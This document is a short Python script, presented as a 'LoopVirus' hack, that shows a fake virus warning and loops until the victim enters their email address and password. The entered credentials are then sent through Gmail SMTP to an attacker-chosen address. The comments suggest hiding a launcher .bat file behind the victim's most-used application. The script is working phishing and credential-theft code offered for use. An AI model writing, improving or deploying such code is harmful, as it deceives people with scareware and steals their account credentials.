#RpZFreak's Basic LoopVirus Email/Password / Hack..
#You can attach and Launch.bat file to the Users Most Used Application


import smtplib
import sys
import smtplib

#You can write anything in the Quote - ("Here comes your Text")
invalid_input = True
def start() :
    print ("Your Computer has been Hacked by a Virus.\n")
    op = input ("Do you want to Delete this Virus?   [Answer in YES or NO in Capital!]")
    if op == "YES":
        #stuff
        invalid_input = False # Set to False because input was valid
        emal=input("Enter Your Email:")
        passwrd=input("Enter your password:")
#Msg transmitter
        msg = (emal+passwrd)

        fromaddr = 'Your Email Here'
        toaddrs  = 'Your Email Here'
        #msg = input("Debugg/Useless Code line")
        username = 'Your Email Here'
        password = 'Your Password/Password for Gmail'
#Don't change anything after this!
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs, msg)
        server.quit()
        sys.exit()
    #elif

    elif op == "NO":
        #stuff
        invalid_input = False # Set to False because input was valid
        print("It's a Virus Idoit,There is no NO option (X_X)")

    elif op == "Crack the Virus.pyHck":
        #stuff
        sys.exit()
         # Quit Code
    else:
        print ("I Asked you YES or NO\n")
        #Email Sending Program


while invalid_input : # this will loop until invalid_input is set to be True
    start()
